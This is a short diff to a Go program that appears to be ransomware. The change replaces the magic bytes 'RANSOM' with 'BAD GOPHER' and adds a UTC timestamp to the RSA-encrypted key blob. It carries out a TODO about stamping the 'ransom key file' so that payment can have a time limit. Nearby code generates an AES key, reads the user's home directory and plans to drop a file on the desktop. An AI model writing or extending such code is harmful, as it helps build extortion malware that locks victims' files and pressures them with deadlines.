@@ -15,6 +15,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 )
 
 // CSPRNG random byte generator
@@ -83,7 +84,8 @@ func main() {
 	// use CLI. Store in this binary with https://github.com/markbates/pkger and
 	// extract onto the user's desktop when done.
 
-	magicBytes := []byte("RANSOM")
+	magicBytes := []byte("BAD GOPHER\n")
+	currentTime := []byte(time.Now().UTC().String() + "\n")
 	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")
 
 	// Generate the symmetric AES encryption key
@@ -100,8 +102,7 @@ func main() {
 	// privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
 
 	// Encrypt the symmetric key with the asymmetric public key
-	// TODO: Add timestamp of encryption to the ransom key file so there can be a time limit
-	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(magicBytes, key...), nil)
+	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)
 
 	home, _ := os.UserHomeDir()
 
